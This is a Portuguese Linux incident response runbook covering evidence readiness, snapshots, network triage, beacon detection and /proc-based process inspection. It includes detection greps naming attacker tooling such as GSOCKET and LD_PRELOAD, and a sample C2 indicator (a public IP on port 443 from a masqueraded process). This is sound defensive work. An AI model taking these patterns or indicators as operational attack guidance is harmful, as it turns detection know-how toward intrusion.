# Runbook de resposta a incidente Linux

<details>
<summary><b>Índice</b> (clique para expandir)</summary>

- [0. Antes de tudo: sem log, sem evidência](#0-antes-de-tudo-sem-log-sem-evidência)
  - [Onde o log precisa estar](#onde-o-log-precisa-estar)
  - [Cheque agora, com o host limpo](#cheque-agora-com-o-host-limpo)
- [1. Preparação](#1-preparação)
  - [Snapshot antes de mexer (cloud/VM)](#snapshot-antes-de-mexer-cloudvm)
- [2. Rede](#2-rede)
  - [2.1. Conexões atuais](#21-conexões-atuais)
  - [2.2. Com `lsof`](#22-com-lsof)
  - [2.3. Filtrar por IP suspeito](#23-filtrar-por-ip-suspeito)
  - [2.4. Informações da rede local](#24-informações-da-rede-local)
  - [2.5. Estado do firewall](#25-estado-do-firewall)
  - [2.6. Captura rápida de tráfego](#26-captura-rápida-de-tráfego)
  - [2.7. Conexão intermitente (beacon)](#27-conexão-intermitente-beacon-o-que-o-retrato-não-pega)
- [3. Processo](#3-processo)
  - [3.1. Informações básicas](#31-informações-básicas)
  - [3.2. Árvore](#32-árvore)
  - [3.3. Executável real](#33-executável-real)
  - [3.4. Diretório atual](#34-diretório-atual)
  - [3.5. Command line real](#35-command-line-real)
  - [3.6. Environment](#36-environment)
  - [3.7. UID/GID/capabilities](#37-uidgidcapabilities)
  - [3.8. File descriptors](#38-file-descriptors)
  - [3.9. Arquivos e sockets abertos](#39-arquivos-e-sockets-abertos)
  - [3.10. Maps e memória mapeada](#310-maps-e-memória-mapeada)
  - [3.11. Cgroups / serviço responsável](#311-cgroups--serviço-responsável)
  - [3.12. Processos do mesmo usuário](#312-processos-do-mesmo-usuário)
  - [3.13. Buscar processos por nome](#313-buscar-processos-por-nome)
  - [3.14. Executáveis deletados ainda em execução](#314-executáveis-deletados-ainda-em-execução)
  - [3.15. Namespaces (esconderijo sem container)](#315-namespaces-esconderijo-sem-container)
  - [3.16. Fileless: o binário que nunca tocou o disco](#316-fileless-o-binário-que-nunca-tocou-o-disco)
- [4. Checklist rápido de processo](#4-checklist-rápido-de-processo)
- [5. Arquivo/binário](#5-arquivobinário)
  - [5.1. Metadata](#51-metadata)
  - [5.2. Datas](#52-datas)
  - [5.3. Tipo](#53-tipo)
  - [5.4. Hashes](#54-hashes)
  - [5.5. Strings](#55-strings)
  - [5.6. Binário ELF](#56-binário-elf)
  - [5.7. Hex](#57-hex)
  - [5.8. Quem está usando o arquivo](#58-quem-está-usando-o-arquivo)
  - [5.9. Nunca execute um arquivo suspeito](#59-nunca-execute-um-arquivo-suspeito)
  - [5.10. Da amostra à família: o que a ferramenta te conta](#510-da-amostra-à-família-o-que-a-ferramenta-te-conta)
- [6. Preservar arquivo suspeito](#6-preservar-arquivo-suspeito)
  - [Memória do processo (binário packed)](#memória-do-processo-binário-packed)
- [7. Persistência](#7-persistência)
  - [7.1. Cron](#71-cron)
  - [7.2. Systemd](#72-systemd)
  - [7.3. Systemd de usuário](#73-systemd-de-usuário)
  - [7.4. `at`](#74-at)
  - [7.5. SSH](#75-ssh)
  - [7.6. Shell startup](#76-shell-startup)
  - [7.7. rc.local / init scripts](#77-rclocal--init-scripts)
  - [7.8. Dynamic linker / preload](#78-dynamic-linker--preload)
  - [7.9. Usuários e privilégios](#79-usuários-e-privilégios)
  - [7.10. Supervisores de processo (nível de usuário)](#710-supervisores-de-processo-nível-de-usuário)
  - [7.11. Containers](#711-containers)
  - [7.12. Outros pontos de persistência](#712-outros-pontos-de-persistência)
- [8. Arquivos suspeitos pelo filesystem](#8-arquivos-suspeitos-pelo-filesystem)
- [9. Timeline](#9-timeline)
  - [9.1. Correlação de sinais](#91-correlação-de-sinais)
- [10. Logs](#10-logs)
  - [10.1. systemd journal](#101-systemd-journal)
  - [10.2. RHEL/CentOS](#102-rhelcentos)
  - [10.3. Debian/Ubuntu](#103-debianubuntu)
  - [10.4. Cloud — a evidência pode estar OFF-BOX](#104-cloud--a-evidência-pode-estar-off-box)
  - [10.5. Metadata / roubo de credencial de instância (cloud)](#105-metadata--roubo-de-credencial-de-instância-cloud)
- [11. Auditd](#11-auditd)
- [12. Login / SSH e movimentação lateral](#12-login--ssh-e-movimentação-lateral)
  - [12.1. Movimentação lateral — a partir deste host](#121-movimentação-lateral--a-partir-deste-host)
  - [12.2. Túneis, port forwarding e pivô](#122-túneis-port-forwarding-e-pivô)
  - [12.3. Credenciais/artefatos que habilitam pivô](#123-credenciaisartefatos-que-habilitam-pivô)
  - [12.4. Mapa de rede interna](#124-mapa-de-rede-interna-para-onde-deu-para-ir)
  - [12.5. Este host foi ALVO de lateral?](#125-este-host-foi-alvo-de-lateral-pivô-de-entrada)
  - [12.6. Movimentação lateral por serviço vulnerável (não-SSH)](#126-movimentação-lateral-por-serviço-vulnerável-não-ssh)
- [13. Bash history](#13-bash-history)
- [14. Identificar serviço vulnerável](#14-identificar-serviço-vulnerável)
  - [Heurística: usuário do malware → estreita o vetor](#heurística-usuário-do-malware--estreita-o-vetor)
- [15. Reverse proxy](#15-reverse-proxy)
  - [Duas armadilhas do proxy](#duas-armadilhas-do-proxy-não-confie-nele-como-proteção)
- [16. Camada de aplicação (agnóstico de linguagem)](#16-camada-de-aplicação-agnóstico-de-linguagem)
  - [Integridade do código](#integridade-do-código-rápido-e-preciso)
  - [Execução de comando (sinks de RCE)](#execução-de-comando-sinks-de-rce-multi-linguagem)
  - [Requisições externas / SSRF](#requisições-externas--ssrf-o-servidor-busca-url-do-cliente)
  - [Escrita de arquivo controlada](#escrita-de-arquivo-controlada-path-traversal--dropoverwrite)
  - [Webshell no docroot](#webshell-no-docroot)
  - [Backdoor no código legítimo (não é webshell)](#backdoor-no-código-legítimo-não-é-webshell)
- [17. Indicadores fortes de reverse shell/backdoor](#17-indicadores-fortes-de-reverse-shellbackdoor)
- [18. Contenção](#18-contenção)
  - [18.1. Bloquear C2](#181-bloquear-c2)
  - [18.2. Desabilitar serviço vulnerável](#182-desabilitar-serviço-vulnerável)
- [19. Remover persistência](#19-remover-persistência)
- [20. Matar processo](#20-matar-processo)
- [21. Remover/quarentenar arquivo](#21-removerquarentenar-arquivo)
- [22. Validar depois da limpeza](#22-validar-depois-da-limpeza)
- [23. Procurar segunda persistência](#23-procurar-segunda-persistência)
  - [Varredura da frota (mesmo IOC em outros hosts)](#varredura-da-frota-mesmo-ioc-em-outros-hosts)
- [24. Verificar integridade do sistema](#24-verificar-integridade-do-sistema)
- [25. Capabilities e SUID](#25-capabilities-e-suid)
- [26. Rotação de credenciais](#26-rotação-de-credenciais)
- [27. Quando rebuild é necessário](#27-quando-rebuild-é-necessário)
  - [Antes do rebuild: a imagem é confiável?](#antes-do-rebuild-a-imagem-é-confiável)
- [28. Coleta rápida em um único bloco](#28-coleta-rápida-em-um-único-bloco)
- [29. Coleta rápida de um PID](#29-coleta-rápida-de-um-pid)
- [30. Coleta rápida de um arquivo](#30-coleta-rápida-de-um-arquivo)
- [31. Red flags para reconhecer rapidamente](#31-red-flags-para-reconhecer-rapidamente)
- [32. Ferramentas úteis para scan/análise](#32-ferramentas-úteis-para-scananálise)
- [33. Regra principal](#33-regra-principal)
- [34. Reduzir o blast radius (blindagem da VM)](#34-reduzir-o-blast-radius-blindagem-da-vm)
  - [34.1. Sandbox do serviço (systemd)](#341-sandbox-do-serviço-systemd)
  - [34.2. Filesystem sem execução](#342-filesystem-sem-execução)
  - [34.3. Egress default-deny](#343-egress-default-deny)
  - [34.4. Identidade e credenciais](#344-identidade-e-credenciais)
  - [34.5. Segmentação e acesso](#345-segmentação-e-acesso)
  - [34.6. Tempo: hosts descartáveis](#346-tempo-hosts-descartáveis)
  - [34.7. Detecção que reduz raio](#347-detecção-que-reduz-raio)
  - [34.8. Auditoria rápida do estado atual](#348-auditoria-rápida-do-estado-atual)
  - [34.9. Configuração base do host (sshd, sysctl, patch, MAC)](#349-configuração-base-do-host-sshd-sysctl-patch-mac)
  - [34.10. A camada da cloud (agnóstico de provedor)](#3410-a-camada-da-cloud-agnóstico-de-provedor)
  - [O que NÃO reduz blast radius](#o-que-não-reduz-blast-radius)
- [35. Comprometimento em nível de kernel](#35-comprometimento-em-nível-de-kernel)
  - [35.1. Antes de tudo: é kernel mesmo?](#351-antes-de-tudo-é-kernel-mesmo)
  - [35.2. Taint e módulos](#352-taint-e-módulos)
  - [35.3. Hooks de função](#353-hooks-de-função-syscall-table-ftrace-kprobes)
  - [35.4. eBPF: o rootkit sem módulo](#354-ebpf-o-rootkit-sem-módulo)
  - [35.5. Método da divergência](#355-método-da-divergência)
  - [35.6. A resposta confiável está fora da caixa](#356-a-resposta-confiável-está-fora-da-caixa)
  - [35.7. Impedir (mais barato que detectar)](#357-impedir-mais-barato-que-detectar)
  - [35.8. Veredito](#358-veredito)
- [36. Escalonamento de privilégio (privesc)](#36-escalonamento-de-privilégio-privesc)
  - [36.1. Varredura rápida](#361-varredura-rápida)
  - [36.2. SUID, SGID e capabilities](#362-suid-sgid-e-capabilities)
  - [36.3. sudo](#363-sudo)
  - [36.4. O que eu escrevo e root executa](#364-o-que-eu-escrevo-e-root-executa)
  - [36.5. Grupos que são root disfarçado](#365-grupos-que-são-root-disfarçado)
  - [36.6. Kernel e componentes com LPE conhecida](#366-kernel-e-componentes-com-lpe-conhecida)
  - [36.7. Ferramentas](#367-ferramentas)
  - [36.8. Mitigação por rota](#368-mitigação-por-rota)
  - [36.9. Higiene contínua](#369-higiene-contínua)
- [37. Exfiltração — o que saiu?](#37-exfiltração--o-que-saiu)
  - [37.1. O alcance: o teto do que pode ter saído](#371-o-alcance-o-teto-do-que-pode-ter-saído)
  - [37.2. Volume: o host mediu sem querer](#372-volume-o-host-mediu-sem-querer)
  - [37.3. Staging: o pacote que ele montou antes de mandar](#373-staging-o-pacote-que-ele-montou-antes-de-mandar)
  - [37.4. Canal: para onde foi](#374-canal-para-onde-foi)
  - [37.5. Banco de dados: a exfiltração que não vira arquivo](#375-banco-de-dados-a-exfiltração-que-não-vira-arquivo)
  - [37.6. A prova está off-box](#376-a-prova-está-off-box)
  - [37.7. Veredito — e o que fazer com ele](#377-veredito--e-o-que-fazer-com-ele)
- [38. Fora da VM: contêiner, Kubernetes e mesh](#38-fora-da-vm-contêiner-kubernetes-e-mesh)
  - [38.1. Contêiner: investigue a partir do host](#381-contêiner-investigue-a-partir-do-host)
  - [38.2. Kubernetes: o que muda de lugar](#382-kubernetes-o-que-muda-de-lugar)
  - [38.3. Service mesh: o que ele quebra e o que ele dá](#383-service-mesh-o-que-ele-quebra-e-o-que-ele-dá)
- [39. Gestão do incidente (decisão, comunicação, registro)](#39-gestão-do-incidente-decisão-comunicação-registro)
  - [39.1. Severidade e quem decide](#391-severidade-e-quem-decide)
  - [39.2. OpSec da resposta](#392-opsec-da-resposta)
  - [39.3. O registro (war log)](#393-o-registro-war-log)
  - [39.4. Notificação: prazos que não são seus](#394-notificação-prazos-que-não-são-seus)
  - [39.5. Critério de encerramento](#395-critério-de-encerramento)
  - [39.6. Post-mortem](#396-post-mortem)
- [40. Rotina: a operação em tempo de paz](#40-rotina-a-operação-em-tempo-de-paz)
  - [40.1. A cadência](#401-a-cadência)
  - [40.2. Caça proativa (sem alerta nenhum)](#402-caça-proativa-sem-alerta-nenhum)
  - [40.3. Exercitar a resposta](#403-exercitar-a-resposta)
  - [40.4. Medir](#404-medir)

</details>

---

# 0. Antes de tudo: sem log, sem evidência

> **Por quê:** as §1–§38 são técnicas para **perguntar ao host**. Nenhuma delas inventa um dado que não foi registrado — se a fonte não estava ligada, ou já rotacionou, não existe comando que recupere. **Olhe para:** a lista desta seção **hoje**, com o host limpo. No dia do incidente ela não muda mais.

Um incidente se fecha respondendo quatro perguntas:

```text
como entrou?             §14 §16
o que fez?               §3 §7 §9 §11
o que saiu?              §37
como impedir que volte?  §34
```

> **Sem resposta para as quatro, o incidente não está fechado — só está quieto.**

E cada uma depende de uma fonte que precisa **já estar ligada** quando o ataque acontece:

```text
como entrou?     log de acesso do web/proxy e da app       §15 §16
                 auditd — EXECVE com o processo PAI        §11    ← o que amarra o vetor
o que fez?       journal + log local, com retenção         §10
                 ctime do filesystem (e relógio correto)   §9
                 baseline: sem "normal" gravado, tudo parece normal   §34.7
o que saiu?      VPC Flow (bytes), log de acesso do storage,
                 log de query do banco, audit da cloud     §37.6  ← o mais ausente de todos
como impedir?    inventário do que existe: portas, SUID,
                 capabilities, hash dos binários           §34.7 §34.8
```

> **E o que se perde não é só a resposta — é o método.** Sem log você ainda acha o **artefato**: o binário, a chave plantada, o cron. Ele está no disco, parado, esperando. O que não se recupera é a **sequência** — qual requisição virou execução, o que o atacante tentou antes de conseguir, em que ordem tocou nas coisas, o que ele fez e não funcionou. Isso é o *modus operandi*, e é a única parte que se reaproveita: hash e IP mudam amanhã (§23), técnica não.

> Três coisas dependem disso e caem juntas: a correlação da §9.1 (que precisa de duas fontes no mesmo segundo, não de uma), a varredura da frota da §23 (você procura o comportamento, não só o IOC) e o *dwell time* da §39.6 — sem a hora da **entrada**, não há como medir quanto tempo ele ficou, e "o que atrasou a detecção?" fica sem resposta. Você endurece o host contra o incidente que já passou, e não contra quem o executou.

---

## Onde o log precisa estar

Log local é evidência de segunda categoria: quem tem root reescreve, trunca e apaga (§10.1, §12). A cópia fora do host é a única que o atacante **do host** não alcança.

```text
fora do host       outra conta/projeto, com credencial que a VM NÃO possui
append-only        quem escreve não pode reescrever nem apagar
retenção > dwell   dwell time real costuma ser de semanas; log de 3 dias não cobre
relógio confiável  NTP e UTC — timestamp errado quebra a §9 inteira
```

> **A conta que importa:** sua retenção define a **idade máxima de incidente que você consegue investigar**. Se o log local rotaciona em 3 dias e o atacante entrou há 30, a §9 e a §10 voltam vazias — e vazio se parece muito com "limpo".

---

## Cheque agora, com o host limpo

```bash
journalctl --disk-usage; ls -la /var/log/*.gz 2>/dev/null | tail -3   # até quando o log local vai?
sudo systemctl is-active auditd                                       # §11 existe neste host?
systemctl is-active rsyslog google-cloud-ops-agent amazon-cloudwatch-agent 2>/dev/null
                                                                      # algo sai do host?
timedatectl | grep -iE 'synchronized|time zone'                       # a §9 pode confiar no relógio?
sudo ss -ltnp | wc -l; sudo find / -xdev -perm -4000 2>/dev/null | wc -l   # há baseline disso? (§34.7)
```

Faltou alguma? A correção não é aqui — é a §34.7. E o custo dela é ordens de grandeza menor que o de um incidente sem resposta.

> **O que é grátis e vem desligado:** VPC Flow Logs, log de acesso do storage, log de query do banco e o auditd. A exceção feliz é o audit administrativo da cloud (GCP Admin Activity, AWS CloudTrail): já está ligado, retém centenas de dias e **não é alterável pelo atacante do host** — em muito incidente é a única fonte que sobra (§10.4, §37.6).

> Este runbook termina na §33 com estas mesmas quatro perguntas. Se ao ler aqui você já sabe que não conseguiria responder a duas delas, comece pela §34 — investigar sem telemetria é adivinhar com passos a mais.

---

# 1. Preparação

> **Por quê:** toda leitura altera o host (atime, cache, log, journal). Registrar estado e hora **antes** é o que separa análise de contaminação de evidência. **Olhe para:** a hora do host pode estar errada/adulterada (§9) — anote também a hora real de uma fonte externa.

Registre horário e host:

```bash
date -Is
hostname
uname -a
cat /etc/os-release
```

Crie um diretório protegido para coleta:

```bash
IR=/root/ir-$(date +%Y%m%d-%H%M%S)

sudo mkdir -p "$IR"
sudo chmod 700 "$IR"
```

Salve informações básicas:

```bash
{
  date -Is
  hostname
  hostnamectl
  uname -a
  cat /etc/os-release
  uptime
} | sudo tee "$IR/host.txt"
```

> Não coloque esse diretório em local compartilhado. `cmdline`, `environ`, logs e configs podem conter secrets.

## Snapshot antes de mexer (cloud/VM)

Preserva evidência e habilita forense/rebuild. Faça ANTES de conter/limpar:

```bash
# GCP
gcloud compute disks snapshot <DISK> --snapshot-names="ir-$(date +%Y%m%d-%H%M%S)"
# AWS
aws ec2 create-snapshot --volume-id <VOL> --description "ir-$(date +%s)"
```

> OpSec: se o atacante tem shell ativo, ações agressivas (kill/block) podem alertá-lo a destruir evidência. Snapshot + coleta primeiro; contenha em bloco.

---

# 2. Rede

> **Por quê:** um backdoor quase sempre mantém uma conexão de saída (C2). A rede costuma ser o primeiro fio a puxar. **Olhe para:** conexão *outbound* para IP público a partir de um processo/usuário de aplicação inesperado — em especial 443 ou portas altas persistentes. E se nada aparecer: o canal pode ser **intermitente**, e aí o retrato instantâneo não serve (§2.7).

## 2.1. Conexões atuais

Principal comando de triagem:

```bash
sudo ss -tunap
```

```text
-t TCP   -u UDP   -a todos (listen + established)
-n não resolve DNS/porta  → mais rápido e não gera consulta que avisa o atacante
-p processo dono do socket → precisa de root; sem sudo você vê a conexão mas não quem a abriu
```

> `ss` lê o estado dos sockets direto do kernel (netlink), não do binário do processo. Por isso um processo pode mentir o próprio nome, mas não some daqui — a menos que haja rootkit em kernel (§7.12, `unhide` na §32).

Somente TCP estabelecido:

```bash
sudo ss -tnp state established
```

Com informações adicionais de socket:

```bash
sudo ss -tnpo state established
```

Portas TCP em listen:

```bash
sudo ss -ltnp
```

UDP:

```bash
sudo ss -lunp
```

---

## 2.2. Com `lsof`

Todas as conexões:

```bash
sudo lsof -Pan -i
```

Somente TCP estabelecido:

```bash
sudo lsof -Pan -iTCP -sTCP:ESTABLISHED
```

Listeners:

```bash
sudo lsof -Pan -iTCP -sTCP:LISTEN
```

---

## 2.3. Filtrar por IP suspeito

```bash
sudo ss -tnp | grep '<IP>'
```

```bash
sudo lsof -Pan -i | grep '<IP>'
```

Exemplo:

```text
10.142.0.12:7304 -> 51.91.190.241:443
users:(("defunct",pid=6574,fd=0))
```

Já temos:

```text
IP remoto: 51.91.190.241
porta: 443
PID: 6574
processo: defunct
```

> Porta `443` não significa necessariamente HTTPS. Malware frequentemente usa 443 para parecer tráfego normal.

---

## 2.4. Informações da rede local

```bash
ip addr
ip route
ip neigh
cat /etc/resolv.conf
```

Rota usada para determinado IP:

```bash
ip route get <IP>
```

---

## 2.5. Estado do firewall

### iptables

```bash
sudo iptables -S
```

```bash
sudo iptables -L INPUT -n -v --line-numbers
sudo iptables -L OUTPUT -n -v --line-numbers
sudo iptables -L FORWARD -n -v --line-numbers
```

Salvar configuração:

```bash
sudo iptables-save > "$IR/iptables.txt"
```

### nftables

```bash
sudo nft list ruleset
```

Salvar:

```bash
sudo nft list ruleset > "$IR/nftables.txt"
```

### firewalld

```bash
sudo firewall-cmd --state
sudo firewall-cmd --list-all
sudo firewall-cmd --list-all-zones
```

> O firewall atual não prova qual firewall existia quando o comprometimento ocorreu.

---

## 2.6. Captura rápida de tráfego

Se uma conexão suspeita ainda estiver ativa:

```bash
sudo timeout 30 tcpdump \
  -ni any \
  host <IP> \
  -s0 \
  -w "$IR/suspect.pcap"
```

Ver sem salvar:

```bash
sudo tcpdump -ni any host <IP>
```

Por porta:

```bash
sudo tcpdump -ni any port 443
```

> **O que o pcap responde mesmo com TLS:** você não lê o conteúdo, mas lê o **comportamento** — periodicidade do beacon (intervalo fixo = C2 automatizado), volume e direção (upload grande = exfiltração), e o **SNI**/certificado no handshake, que revela o domínio de destino. Também confirma se a conexão está viva de fato ou é socket órfão.

```bash
sudo tcpdump -ni any -A 'tcp port 443 and tcp[((tcp[12:1] & 0xf0) >> 2):1] = 0x16' | grep -a -o '[a-z0-9.-]*\.[a-z]\{2,\}'   # SNI em claro
```

> `-s0` captura o pacote inteiro (sem truncar) e `-w` salva cru para análise offline no Wireshark. Cuidado: o pcap pode conter dados sensíveis em tráfego não-TLS — trate como o resto da coleta (§1).

---

## 2.7. Conexão intermitente (beacon): o que o retrato não pega

As §2.1–§2.3 são um **retrato de um instante**. Um C2 que fala 2 segundos a cada 10 minutos está ausente de 99,7% dos retratos possíveis — e essa ausência vai parecer limpeza. Detectar o intermitente exige trocar retrato por **acúmulo**: ou você repete a pergunta, ou pergunta a algo que registra sozinho.

### O rastro que o beacon deixa (janela estendida, de graça)

```bash
sudo ss -tan state time-wait                         # socket residual de conexão JÁ FECHADA
sudo conntrack -L 2>/dev/null | grep -vE 'ESTABLISHED|127\.0\.0\.1'   # conexões curtas ainda na tabela
sudo journalctl -u systemd-resolved --since '2 hours ago' 2>/dev/null | grep -i query
```

> `TIME_WAIT` estende sua janela em até ~60 s: o `ss` que perdeu o beacon ainda pode pegar o rastro dele.

> **DNS só ajuda se houver domínio — e três condições.** A resolução deixa rastro no resolver local e no servidor DNS, onde o atacante do host não apaga; mas isso exige que o implante use **nome** (não IP fixo), que o **TTL** seja menor que o intervalo do beacon (senão o cache responde e não há consulta nova) e que ele não resolva por **DoH/DoT**, que passa por fora do resolver local. Com IP fixo compilado no binário (§5.5), não existe consulta nenhuma — e essa via não serve.

> **A inversão é o sinal mais forte:** tráfego legítimo quase sempre passa por nome. Uma conexão de saída para IP público **sem resolução DNS anterior** é, por si, anomalia — e é uma hipótese de caça melhor do que procurar o domínio (§40.2). Vale para os dois casos: com domínio você acha a consulta; com IP fixo você acha a ausência dela.

Capturar as duas coisas na mesma janela e tirar a diferença:

```bash
sudo timeout 300 tcpdump -ni any -w "$IR/dns-conn.pcap" \
  'port 53 or (tcp[tcpflags] & (tcp-syn|tcp-ack) == tcp-syn)'
# IPs que o DNS entregou
tshark -r "$IR/dns-conn.pcap" -Y dns.a -T fields -e dns.a | tr ',' '\n' | sort -u > /tmp/resolvidos
# IPs para os quais o host abriu conexão
tshark -r "$IR/dns-conn.pcap" -Y 'tcp.flags.syn==1 && tcp.flags.ack==0' \
  -T fields -e ip.dst | sort -u > /tmp/destinos
# contatados SEM terem sido resolvidos
comm -13 /tmp/resolvidos /tmp/destinos \
  | grep -vE '^(10\.|127\.|169\.254\.|192\.168\.|172\.(1[6-9]|2[0-9]|3[01])\.)'
```

```bash
sudo gethostlatency-bpfcc          # quem resolve o quê, com PID e nome consultado (§32)
sudo strings -a "$FILE" | grep -oE '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' | sort -u   # IP literal no binário (§5.5)
```

> **Como ler a diferença:** o que sobra são destinos contatados por IP puro. Há legítimo aí — NTP, metadata, espelho de pacote fixado, agente de monitoração — e há o falso positivo estrutural: **processo que resolveu antes da sua captura começar e usou o cache**. Por isso confira o `etime` do dono do socket (§3.1): processo antigo pode ter resolvido há horas; processo que **nasceu dentro da sua janela** e nunca consultou DNS não tem essa desculpa.

> **`gethostlatency` fecha o outro lado:** ele lista os processos que **chamam** o resolvedor. Um processo que abre conexões de saída e nunca aparece nessa lista está usando IP fixo — que é exatamente o perfil do implante compilado com o C2 dentro (§5.5, §5.10).

> **DoH é o caso especial:** se o implante resolve por DNS-over-HTTPS, a consulta vira uma conexão TLS comum e a diferença acima **acusa corretamente** — só que o destino será um resolvedor conhecido. Conexão para `1.1.1.1`, `8.8.8.8` ou `9.9.9.9` a partir de um processo que não é browser nem o resolvedor do sistema é achado, não ruído.

```bash
sudo ss -tnp | grep -E '1\.1\.1\.1|1\.0\.0\.1|8\.8\.(8\.8|4\.4)|9\.9\.9\.9'
```

### Acumular: repita a pergunta

```bash
# 30 min de amostragem a cada 5 s; cada linha = epoch + destino
for i in $(seq 1 360); do
  T=$(date +%s)
  sudo ss -tn state established 2>/dev/null | grep -v '^Recv-Q' | awk -v t="$T" '{print t, $4}'
  sleep 5
done | tee "$IR/beacon.txt" | awk '{print $2}' | sort | uniq -c | sort -rn | head -20
```

```bash
# o mesmo destino em intervalos REGULARES = automação
awk '$2 ~ /<IP>/ {print $1}' "$IR/beacon.txt" | awk 'p{print $1-p} {p=$1}' | sort -n | uniq -c
```

> **A leitura:** delta quase constante (com ou sem jitter pequeno) é programa. Humano é irregular — rajada, pausa longa, rajada. É essa a diferença entre "alguém está usando este host agora" e "algo está reportando para alguém".

### Perguntar a quem já registra sozinho

```bash
sudo conntrack -E -e NEW -p tcp 2>/dev/null | grep -v '127\.0\.0\.1'   # evento no instante em que nasce
sudo tcpconnect-bpfcc                    # toda connect() com PID e destino (§32)
sudo execsnoop-bpfcc                     # se o processo NASCE a cada beacon, ele aparece aqui
./pspy64                                 # idem, sem root e sem instalar nada (§32)
```

> `conntrack -E` é o melhor custo/benefício num host qualquer: ele **transmite o evento** no momento em que a conexão nasce, então a duração dela deixa de importar. Deixe redirecionado para `$IR/` enquanto você investiga o resto.

### O contador registra o que você não viu

Se a regra de egress da §34.3 existe, ela já está contando — inclusive tentativas de um processo que já morreu:

```bash
sudo iptables -L OUTPUT -n -v --line-numbers    # a coluna 'pkts' cresce a cada tentativa
sudo iptables -I OUTPUT 1 -m owner --uid-owner <USER> -j LOG --log-prefix 'EGRESS-APP '
sudo journalctl -kf | grep 'EGRESS-APP'         # cada tentativa, com hora e destino
```

> **Vantagem estrutural:** o contador registra a **tentativa**, não a conexão. Mesmo com o C2 já bloqueado (§18.1/§34.3) e nenhuma conexão se completando, o beacon continua aparecendo — e é exatamente esse o sinal que a §22 procura depois da limpeza: algo ainda vivo tentando sair.

### O outro lado: o processo também é intermitente

```text
processo VIVO dormindo entre beacons   'etime' longo, nenhuma conexão agora
                                       → §3 funciona: exe, fd e maps continuam lá
processo NASCE e MORRE a cada beacon   PID muda toda vez, 'etime' sempre curto
                                       → §3 não pega nada. Vá pelo GATILHO (§7)
```

```bash
# o gatilho denuncia o intervalo
sudo grep -RIna '\*/' /etc/cron* /var/spool/cron 2>/dev/null    # '*/10 * * * *' = beacon de 10 min (§7.1)
systemctl list-timers --all                                      # OnUnitActiveSec = o mesmo padrão (§7.2)
```

> Se o intervalo que você mediu no `ss` bate com um `*/N` do cron ou um `OnUnitActiveSec` de um timer, você achou as duas pontas de uma vez: o gatilho e o canal.

### E a resposta definitiva vem de fora

```text
VPC Flow Logs / netflow   registra TODO fluxo, curto ou longo — e entrega a periodicidade pronta
log do proxy / NAT        mesmo efeito, com o destino
DNS central               a consulta periódica ao mesmo domínio — se o C2 usar nome (ver acima)
```

> Mesmo argumento da §0 e da §10.4: o host só responde sobre o instante em que você perguntou; a rede registra o intervalo inteiro sem você pedir nada.

---

# 3. Processo

> **Por quê:** confirmar o que o processo suspeito **realmente** é — o `ps` mostra o nome que o processo diz ter, que pode ser forjado. **Olhe para:** exe em `/home`/`/tmp`/`/dev/shm`, nome camuflado de thread de kernel, pai `PID 1` sem motivo, child `sh`/`bash`, PTY + socket remoto.

> **Fundamento:** `ps` mostra `comm`/`cmdline`, campos que o **próprio processo reescreve** (`prctl(PR_SET_NAME)`, `exec -a`, sobrescrita do argv). Já `/proc/<pid>/exe` e `/proc/<pid>/cwd` são links mantidos pelo **kernel** para o inode real — o processo não os controla. Regra: nome mente, `exe` não.

Encontrou um PID suspeito:

```bash
PID=<PID>
```

---

## 3.1. Informações básicas

```bash
sudo ps -o \
pid,ppid,user,group,lstart,etime,stat,args \
-p "$PID"
```

```text
lstart  hora exata de início → âncora para a timeline (§9)
etime   há quanto tempo roda → "3 dias" num processo que você nunca viu = ruim
stat    S dormindo | R rodando | Z zumbi | D I/O ininterrupto | s líder de sessão
        + foreground | l multi-thread | < prioridade alta
```

> `stat` com `s` (líder de sessão) num processo sem terminal, ou `Z` persistente, chama atenção: shells de backdoor costumam criar sessão própria para sobreviver ao pai.

Ver também PID pai:

```bash
PPID=$(ps -o ppid= -p "$PID" | tr -d ' ')
sudo ps -o \
pid,ppid,user,group,lstart,etime,stat,args \
-p "$PID","$PPID"
```

---

## 3.2. Árvore

```bash
sudo pstree -aps "$PID"
```

Árvore geral:

```bash
sudo pstree -ap
```

Outra visão:

```bash
ps -ef --forest
```

> Ler a árvore **de baixo para cima** dá o vetor: quem executou quem. `nginx → php-fpm → sh → curl` é RCE em texto. `PPID 1` significa que o pai já morreu (daemonizou ou saiu de propósito) e o rastro se perdeu — aí quem restaura a origem é o cgroup (§3.11) ou o audit (§11).

---

## 3.3. Executável real

Não confie no nome exibido pelo `ps`.

```bash
sudo readlink -f /proc/$PID/exe
```

Exemplo:

```text
ps:
[card0-crtc8]

/proc/6574/exe:
/home/node/.config/htop/defunct
```

Isso indica masquerading do nome do processo.

---

## 3.4. Diretório atual

```bash
sudo readlink -f /proc/$PID/cwd
```

Locais especialmente suspeitos:

```text
/tmp
/var/tmp
/dev/shm
/home/<user>/.config
/home/<user>/.cache
diretórios temporários em NFS
```

> **Por que o cwd importa além de "lugar suspeito":** é onde o processo resolve **caminhos relativos** — um implante com cwd no diretório de upload da app está a um `open("x")` de ler e escrever ali. E, na prática, o cwd costuma ser o diretório de onde ele foi **executado**: um cwd dentro do docroot ou da pasta de uploads entrega o vetor sem você precisar chegar na §16.

```text
cwd = /                        daemon bem comportado faz chdir("/") — normal, ignore
cwd '(deleted)'                o diretório de trabalho foi apagado: rastro sendo limpo
cwd em upload/dados da app     o vetor, de graça (§16)
cwd em /tmp, /dev/shm, ~/.cache  §8
```

---

## 3.5. Command line real

```bash
sudo sh -c "tr '\0' ' ' < /proc/$PID/cmdline"
echo
```

```text
cmdline VAZIO e /proc/<pid>/exe existe   thread de KERNEL não tem 'exe'. Processo de userspace
                                         com cmdline vazio está se disfarçando de uma (§31)
argv[0] != basename do exe               'exec -a': renomeado no momento do exec (§7.1)
linha truncada no 'ps'                   o /proc devolve inteira; o 'ps' corta na largura
senha/token como argumento               /proc/*/cmdline é legível por QUALQUER usuário do host
```

> **Para que serve, e para que não serve:** `cmdline` é a mesma fonte que o `ps` lê, e o processo pode reescrevê-la. Ela mostra o **disfarce** — não confirma identidade. Confirmação é o `exe` (§3.3).

---

## 3.6. Environment

```bash
sudo sh -c "tr '\0' '\n' < /proc/$PID/environ"
```

Filtrar:

```bash
sudo sh -c "tr '\0' '\n' < /proc/$PID/environ" \
  | grep -E \
  'HOME|USER|PATH|SHELL|NODE|PM2|LD_PRELOAD|GS_|GSOCKET'
```

> `environ` pode conter senhas, tokens, URLs privadas e chaves.

